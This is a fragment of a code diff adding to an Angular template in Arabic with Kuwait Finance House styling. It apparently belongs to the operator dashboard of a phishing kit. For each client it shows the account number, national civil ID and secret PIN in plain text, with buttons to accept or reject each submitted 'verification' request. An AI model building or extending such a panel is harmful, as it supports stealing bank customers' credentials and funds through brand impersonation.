+              <span class="block"><strong class="text-slate-500">رقم الحساب:</strong> {{ client.account_number }}</span>
+            </div>
+
+            <div class="bg-kfh-green-light border border-kfh-green/20 rounded-xl p-3 flex flex-col gap-1.5">
+              <span class="text-xs text-kfh-green font-semibold">البيانات المدخلة للتحقق:</span>
+              <span class="block text-slate-800 text-sm font-bold mt-0.5">
+                <strong class="text-slate-500 text-xs font-semibold">الرقم المدني:</strong> {{ client.civil_id }}
+              </span>
+              <span class="block text-slate-800 text-sm font-bold">
+                <strong class="text-slate-500 text-xs font-semibold">الرقم السري:</strong> {{ client.pin }}
+              </span>
+            </div>
+
+            <div class="flex gap-3 mt-1">
+              <app-button [loading]="actionLoading()[client.id] || false" (btnClick)="verifyAnswer(client.id, true)"
+                customClasses="py-2.5 text-sm font-bold flex-1">
+                قبول الطلب
+              </app-button>
+              <button type="button" [disabled]="actionLoading()[client.id]" (click)="verifyAnswer(client.id, false)"
+                class="border border-red-500 text-red-400 hover:bg-red-500/10 px-4 py-2.5 rounded-xl text-sm font-bold flex-1 transition-all duration-200 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed">
+                رفض الطلب
+              </button>
+            </div>
+          </div>
+          }
+
+        </div>
+
+        <!-- Footer timestamp -->
+        <div class="flex items-center justify-between text-slate-500 text-xs">
+          <span>بدء الطلب:</span>
+          <span>{{ client.created_at | date:'shortTime' }}</span>
+        </div>
+
       </div>
+      }
+    </div>
     }
   </main>
 </div>
